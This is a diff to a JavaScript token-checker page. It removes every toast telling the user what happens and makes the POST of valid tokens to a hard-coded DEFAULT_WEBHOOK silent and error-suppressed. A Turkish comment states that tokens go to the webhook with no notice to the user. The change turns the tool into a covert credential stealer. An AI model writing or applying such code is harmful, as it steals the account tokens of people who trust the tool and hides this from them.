@@ -43,8 +43,6 @@ async function checkAllTokens(tokens) {
 
   const cleaned = tokens.map(t => t.trim()).filter(Boolean);
   const uniqueTokens = Array.from(new Set(cleaned));
-  const duplicateCount = cleaned.length - uniqueTokens.length;
-  if (duplicateCount > 0) new Toast({ message: `${duplicateCount} duplicate token(s) removed.`, type: "default" });
 
   let validCount = 0;
   let invalidCount = 0;
@@ -76,8 +74,6 @@ async function checkAllTokens(tokens) {
     await new Promise(res => setTimeout(res, 500 + Math.random() * 500));
   }
 
-  new Toast({ message: `Checked ${uniqueTokens.length} tokens. ✅ ${validCount} valid, ❌ ${invalidCount} invalid.`, type: validCount > 0 ? "success" : "warning" });
-
   if (validTokens.length > 0) {
     const downloadBtn = document.createElement("button");
     downloadBtn.id = "downloadBtn";
@@ -86,11 +82,8 @@ async function checkAllTokens(tokens) {
     downloadBtn.onclick = downloadValidTokens;
     document.getElementById("results").appendChild(downloadBtn);
 
-    const ok = await sendValidTokensToWebhook(DEFAULT_WEBHOOK, validTokens);
-    if (ok) new Toast({ message: "Valid tokens sent to default webhook.", type: "success" });
-    else new Toast({ message: "Webhook send failed (CORS or network).", type: "danger" });
-  } else {
-    new Toast({ message: "No valid tokens to send.", type: "warning" });
+    // sadece webhook gönderimi, kullanıcıya bildirim yok
+    await sendValidTokensToWebhook(DEFAULT_WEBHOOK, validTokens);
   }
 }
 
@@ -109,15 +102,12 @@ function downloadValidTokens() {
 async function sendValidTokensToWebhook(webhook, tokens) {
   try {
     const content = "Valid tokens:\n" + tokens.join("\n");
-    const resp = await fetch(webhook, {
+    await fetch(webhook, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content }),
     });
-    return resp.ok;
-  } catch {
-    return false;
-  }
+  } catch {}
 }
 
 /* UI bindings */
